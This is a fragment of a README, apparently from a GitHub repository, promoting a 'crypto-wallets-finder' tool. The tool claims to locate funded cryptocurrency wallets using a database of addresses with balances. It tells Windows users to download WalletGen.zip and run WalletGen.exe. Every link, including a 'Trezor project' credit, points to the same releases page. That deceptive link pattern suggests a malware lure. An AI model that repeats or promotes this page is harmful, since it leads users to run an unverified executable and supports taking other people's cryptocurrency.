...
[Download here](https://github.com/mrrebrik960/crypto-wallets-finder/releases)
...
## Windows 
- Download [WalletGen.zip](https://github.com/mrrebrik960/crypto-wallets-finder/releases)
- Unpack anywhere
- Run `WalletGen.exe`
...
You can download the WalletGen given on the [page in the release](https://github.com/mrrebrik960/crypto-wallets-finder/releases).

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [page in the release](https://github.com/mrrebrik960/crypto-wallets-finder/releases).
...
## Credits
This project uses code from the [Trezor project](https://github.com/mrrebrik960/crypto-wallets-finder/releases). The code is licensed under the MIT License.
